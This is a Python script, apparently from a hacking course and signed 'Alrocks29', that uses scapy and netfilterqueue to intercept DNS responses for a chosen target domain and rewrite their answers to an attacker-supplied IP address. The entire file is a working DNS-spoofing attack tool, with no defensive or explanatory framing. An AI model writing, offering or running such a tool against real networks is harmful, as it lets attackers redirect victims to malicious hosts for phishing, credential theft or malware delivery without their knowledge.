#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue
import optparse
import queue
queue = queue.Queue()


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target Address")
    parser.add_option("-s", "--source", dest="source", help="Source Address")
    (options, arguments) = parser.parse_args()

    if not options.target:
        parser.error("[-] Please specify target Website , use --help for more.")
    elif not options.source:
        parser.error("[-] Please specify source Website , use --help for more.")
    return options


def process_packets(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if options.target in qname:
            print("[+]Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata=options.source)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


options = get_arguments()
print("DNS SPOOF\n\t-Alrocks29")
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packets)
    queue.run()

except KeyboardInterrupt:
    print ("\n[-] Quitting.................")
